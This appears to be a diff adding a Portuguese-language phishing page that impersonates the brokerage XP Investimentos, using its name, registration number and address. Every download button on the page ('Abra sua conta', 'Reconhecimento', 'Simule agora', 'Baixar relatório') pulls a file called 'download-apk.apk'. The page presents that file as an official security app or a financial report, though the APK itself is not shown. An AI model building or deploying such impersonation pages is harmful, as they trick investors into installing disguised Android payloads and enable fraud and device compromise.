@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="VEM SER XP - Proteja seus investimentos com nosso programa de segurança para dispositivos móveis.">
+    <meta name="keywords" content="XP Investimentos, segurança, investimentos, aplicativo">
+    <title>XP</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+        }
+        .header-inner {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background-color: #000;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+        }
+        .logo {
+            height: 40px;
+            margin-right: 20px;
+        }
+        .desktop-nav {
+            display: flex;
+            align-items: center;
+        }
+        .desktop-nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 15px;
+            position: relative;
+        }
+        .desktop-nav a::after {
+            content: "▼";
+            font-size: 10px;
+            position: absolute;
+            margin-left: 5px;
+        }
+        .desktop-nav .no-arrow::after {
+            content: none;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+        }
+        .login a {
+            color: #fff;
+            text-decoration: none;
+            margin-left: 15px;
+        }
+        .login .button {
+            background-color: #ffd700;
+            color: #000;
+            padding: 10px 20px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+        .login .button:hover {
+            background-color: #e6c200;
+        }
+        .hamburger {
+            display: none;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 5px;
+            margin-right: 10px;
+        }
+        .hamburger span {
+            display: block;
+            width: 25px;
+            height: 3px;
+            background: #fff;
+            margin: 5px 0;
+        }
+        .mobile-menu {
+            display: none;
+            position: absolute;
+            top: 60px;
+            left: 0;
+            width: 100%;
+            background: #000;
+            padding: 20px;
+            z-index: 1000;
+        }
+        .mobile-menu.active {
+            display: block;
+        }
+        .mobile-menu a {
+            display: block;
+            padding: 10px;
+            color: #fff;
+            text-decoration: none;
+        }
+        .hero {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 50px;
+            background-color: #000;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            height: 70vh; /* Aumentei a altura para mostrar mais o banner */
+            position: relative;
+            width: 100%;
+        }
+        .hero-text {
+            background-color: rgba(255, 255, 255, 0.7); /* Reduzi a opacidade para mostrar mais o banner */
+            padding: 20px;
+            border-radius: 10px;
+            color: #000;
+            max-width: 600px; /* Definindo uma largura máxima para centralizar melhor */
+            margin: 0 auto; /* Centralizando horizontalmente */
+        }
+        .hero-text h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+        }
+        .hero-text p {
+            font-size: 24px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            text-shadow: none;
+        }
+        .hero-text a.button {
+            background-color: #ffd700;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            text-decoration: none;
+            display: inline-block;
+            border-radius: 5px;
+            transition: transform 0.2s ease, background-color 0.3s ease;
+        }
+        .hero-text a.button:hover {
+            background-color: #e6c200;
+            transform: scale(1.05);
+        }
+        .sidebar {
+            background-color: rgba(51, 51, 51, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 300px;
+        }
+        .sidebar h3 {
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        .sidebar a.button {
+            background-color: transparent;
+            color: #ffd700;
+            border: 1px solid #ffd700;
+            padding: 10px 20px;
+            font-size: 16px;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+        .sidebar a.button:hover {
+            background-color: #ffd700;
+            color: #000;
+        }
+        .products {
+            padding: 50px;
+            text-align: center;
+        }
+        .products h2 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+        .products p {
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+        .cards {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        .card {
+            background-color: #111;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: left;
+            width: 300px;
+        }
+        .card h3 {
+            margin-bottom: 10px;
+            font-size: 20px;
+        }
+        .card p {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .card a.button {
+            background-color: #ffd700;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            text-decoration: none;
+            display: inline-block;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+        .card a.button:hover {
+            background-color: #e6c200;
+        }
+        footer {
+            padding: 20px;
+            background-color: #000;
+            color: #fff;
+            text-align: center;
+        }
+        footer a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        footer p {
+            margin: 10px 0;
+        }
+        @media (max-width: 768px) {
+            .header-inner {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding: 10px;
+            }
+            .header-left {
+                display: flex;
+                align-items: center;
+            }
+            .hamburger {
+                display: block;
+            }
+            .logo {
+                height: 30px;
+            }
+            .desktop-nav {
+                display: none;
+            }
+            .login a:not(.button) {
+                display: none;
+            }
+            .hero {
+                background-image: url('img/android.png');
+                height: 70vh;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                padding: 0;
+            }
+            .hero-text {
+                text-align: center;
+                width: 90%;
+                padding: 10px;
+            }
+            .hero-text h1 {
+                font-size: 24px;
+            }
+            .hero-text p {
+                font-size: 14px;
+            }
+            .hero-text a.button {
+                padding: 8px 16px;
+                font-size: 14px;
+            }
+            .sidebar {
+                display: none;
+            }
+            .products {
+                padding: 20px;
+            }
+            .products h2 {
+                font-size: 24px;
+            }
+            .products p {
+                font-size: 14px;
+            }
+            .cards {
+                flex-direction: column;
+                align-items: center;
+            }
+            .card {
+                width: 100%;
+                max-width: 300px;
+            }
+        }
+        @media (min-width: 769px) {
+            .hero {
+                background-image: url('img/desktop.png');
+                background-size: cover;
+                background-position: center;
+                background-repeat: no-repeat;
+            }
+            .hero-text {
+                max-width: 600px; /* Centraliza e limita a largura */
+                margin: 0 auto; /* Centraliza horizontalmente */
+            }
+        }
+        #splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 1s ease-in-out;
+        }
+        #splash-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        #splash-screen img {
+            max-width: 50%;
+            max-height: 50%;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-inner">
+            <div class="header-left">
+                <button class="hamburger"><span></span><span></span><span></span></button>
+                <img src="img/logo.png" alt="Logo XP" class="logo">
+                <div class="desktop-nav">
+                    <a href="#">Sobre a XP</a>
+                    <a href="#">Produtos e Serviços</a>
+                    <a href="#">Conteúdos</a>
+                    <a href="#" class="no-arrow">Empresas</a>
+                    <a href="#" class="no-arrow">Área do Trader</a>
+                    <a href="#">Tire suas dúvidas</a>
+                </div>
+            </div>
+            <div class="header-right">
+                <div class="login">
+                    <a href="#">Acesse sua conta</a>
+                    <a href="download-apk.apk" download class="button">Abra sua conta</a>
+                </div>
+            </div>
+        </div>
+        <nav class="mobile-menu">
+            <a href="#">Sobre a XP</a>
+            <a href="#">Produtos e Serviços</a>
+            <a href="#">Conteúdos</a>
+            <a href="#">Empresas</a>
+            <a href="#">Área do Trader</a>
+            <a href="#">Tire suas dúvidas</a>
+            <a href="#">Acesse sua conta</a>
+        </nav>
+    </header>
+    <div class="hero">
+        <div class="hero-text">
+            <p>O Reconhecimento XP é um programa de celular projetado para detectar, prevenir e remover um software malicioso e tem como objetivo proteger o sistema contra vírus, worms, trojans, spyware, adware e outros tipos de ameaças. Que podem comprometer a sua segurança e Investimentos!</p>
+            <a href="download-apk.apk" download class="button">Reconhecimento</a>
+        </div>
+        <div class="sidebar">
+            <h3>Simule grátis quanto seu dinheiro pode render na XP</h3>
+            <a href="download-apk.apk" download class="button">Simule agora</a>
+            <h3>CDB 150% do Banco XP: Invista até R$ 60 mil com garantia do FGC</h3>
+            <a href="download-apk.apk" download class="button">confira</a>
+        </div>
+    </div>
+    <div class="products">
+        <h2>Proteção e serviços financeiros</h2>
+        <p>Tudo o que a XP oferece para você aproveitar as melhores oportunidades de investimentos</p>
+        <div class="cards">
+            <div class="card">
+                <h3>Onde investir em 2025</h3>
+                <p>Confira as projeções e recomendações de investimento dos nossos especialistas para o próximo ano.</p>
+                <a href="download-apk.apk" download class="button">Baixar relatório</a>
+            </div>
+            <div class="card">
+                <h3>Segurança</h3>
+                <p>programa de celular projetado para detectar, prevenir e remover um software maliciosos.</p>
+                <a href="download-apk.apk" download class="button">Baixar relatório</a>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <p>© 2025 XP Inc. Todos os direitos reservados.</p>
+        <p>XP Investimentos CCTVM S/A, CNPJ: 02.332.886/0001-04</p>
+        <p>Av. Chedid Jafet, 75 - Torre Sul - Vila Olímpia - São Paulo - SP - CEP: 04551-065</p>
+        <a href="#">Termos de Uso</a> | <a href="#">Política de Privacidade</a>
+    </footer>
+    <div id="splash-screen">
+        <img src="img/splash.png" alt="Tela de Splash">
+    </div>
+    <script>
+        document.querySelector('.hamburger').addEventListener('click', function() {
+            document.querySelector('.mobile-menu').classList.toggle('active');
+        });
+
+        const splashScreen = document.getElementById('splash-screen');
+
+        splashScreen.addEventListener('click', function() {
+            splashScreen.classList.add('hidden');
+            setTimeout(function() {
+                splashScreen.style.display = 'none';
+            }, 1000);
+        });
+
+        setTimeout(function() {
+            splashScreen.classList.add('hidden');
+            setTimeout(function() {
+                splashScreen.style.display = 'none';
+            }, 1000);
+        }, 3000);
+    </script>
+</body>
+</html>
